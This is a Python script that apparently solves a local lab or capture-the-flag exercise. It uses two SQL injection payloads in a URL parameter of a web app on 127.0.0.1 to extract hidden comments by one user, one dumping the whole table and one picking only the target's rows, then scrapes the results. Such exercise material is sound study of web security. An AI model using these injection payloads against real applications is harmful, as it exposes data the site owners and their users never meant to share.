import requests
from bs4 import BeautifulSoup as bs

'''
We are searching for an hidden message, written by the user james@bond.mi5
'''

general_request = "http://127.0.0.1:5001/messages?id="

'''
    For the first immediate solution just put an always true condition (1=1)
    to retrieve all the database included the excluded user's comments
'''
def first_solution():

    def first_sql_injection():
        return "1' or '1' = '1"
    
    def page_scraping(page):

        parsed_page = bs(page.text, 'html.parser')

        # Retrieve all comments from james

        james = [comment_pointer.findNext('blockquote').text for comment_pointer in parsed_page.find_all(text='james said :')]
        text = ''
        for i, c in enumerate(james):
            text += f"Comment #{i+1}:\n" + c + "\n"

        return text

    return page_scraping(requests.get(general_request + first_sql_injection()))

'''
    As the db could be very large, it's more appropriate to force
    only our target user's data to be extracted, not all the db
    So we should 'break' the first part so it doesn't return anything
    and then use our malicious query
'''
def second_solution():
    
    def second_sql_injection():
        random_string = 'anw23'
        return f"{random_string}' or mail = 'james@bond.mi5"

    def page_scraping(page):

        parsed_page = bs(page.text, 'html.parser')

        james = [comment_pointer.text for comment_pointer in parsed_page.find_all('blockquote')]
        text = ''
        for i, c in enumerate(james):
            text += f"Comment #{i+1}:\n" + c + "\n"

        return text


    return page_scraping(requests.get(general_request + second_sql_injection()))

if __name__ == '__main__':
    sol1 = first_solution()
    print(sol1)
    sol2 = second_solution()
    print(sol2)

    print(sol1 == sol2)